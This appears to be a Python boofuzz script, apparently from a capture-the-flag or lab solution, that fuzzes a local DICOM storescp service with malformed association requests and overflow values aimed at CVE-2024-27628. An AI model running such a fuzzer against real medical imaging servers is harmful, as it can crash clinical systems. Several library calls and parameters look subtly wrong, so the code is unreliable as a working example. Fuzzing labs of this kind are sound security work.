# Add new file: dicom_fuzzer.py
from boofuzz import *
from solution.scapy_DICOM import DICOM
from solution.fuzzer.fuzzing_monitor import FlagExposureMonitor
import time

def build_fuzzer():
    session = Session(
        target=Target(
            connection=SocketConnection("localhost", 104, proto='tcp'),
            monitors=[
                FlagExposureMonitor(),
                ProcessMonitor(
                    proc_name="storescp",
                    start_commands=["systemctl start storescp"],
                    stop_commands=["systemctl stop storescp"],
                    crash_filename="storescp_crashes.log"
                )
            ]
        ),
        console_gui=True,
        web_port=26000,  # Web GUI port
        crash_threshold_element=3,  # Max crashes per element
        sleep_time=0.2,
        keep_web_open=True
    )

    s_initialize("DICOM_Associate")
    with s_block("DICOM_Header"):
        s_byte(0x01, name="pdu_type", fuzzable=False)  # A-ASSOCIATE-RQ
        s_byte(0x00, name="reserved1", fuzzable=True)
        s_size("length", length=4, endian=">", fuzzable=False)
        
    with s_block("A_ASSOCIATE_RQ"):
        s_word(0x0001, name="protocol_version", fuzzable=True)
        s_random(b"\x00\x00", 2, 2, name="reserved2")
        s_string("TEST_AE", size=16, padding=b'\x00', name="called_ae_title")
        s_string("FUZZ_AE", size=16, padding=b'\x00', name="calling_ae_title")
        s_random(b"\x00"*32, 32, 32, name="reserved3")
        
    # CVE-specific Fuzzing
    s_initialize("CVE_2024_27628")
    with s_block("PDV_Header"):
        s_size("pdv_length", length=4, endian=">")
        s_byte(0x01, name="context_id")  # Valid context ID
        s_byte(0x01, name="flags")  # Last fragment
        
    with s_block("ExploitDataset"):
        # Rainbow table for rows/cols overflow values
        s_group("overflow_values", values=[
            b"\xff\xff",  # 65535
            b"\x7f\xff",  # 32767
            b"\xff\x7f",  # 65407
            b"\x00\x00"   # Null
        ])
        s_repeat("overflow_values", min_reps=2, max_reps=4, step=2)

    session.connect(s_get("DICOM_Associate"))
    session.connect(s_get("CVE_2024_27628"))

    # CI/CD friendly fuzzing with timeout
    start_time = time.time()
    max_duration = 300  # 5 min
    test_count = 0
    
    try:
        while time.time() - start_time < max_duration:
            session.fuzz(max_depth=2)
            test_count += 1
            if test_count % 100 == 0:
                print(f"Completed {test_count} test cases")
    except KeyboardInterrupt:
        print("\nFuzzing interrupted")
    
    session.finalize()
    print(f"Total test cases executed: {test_count}")

if __name__ == "__main__":
    build_fuzzer()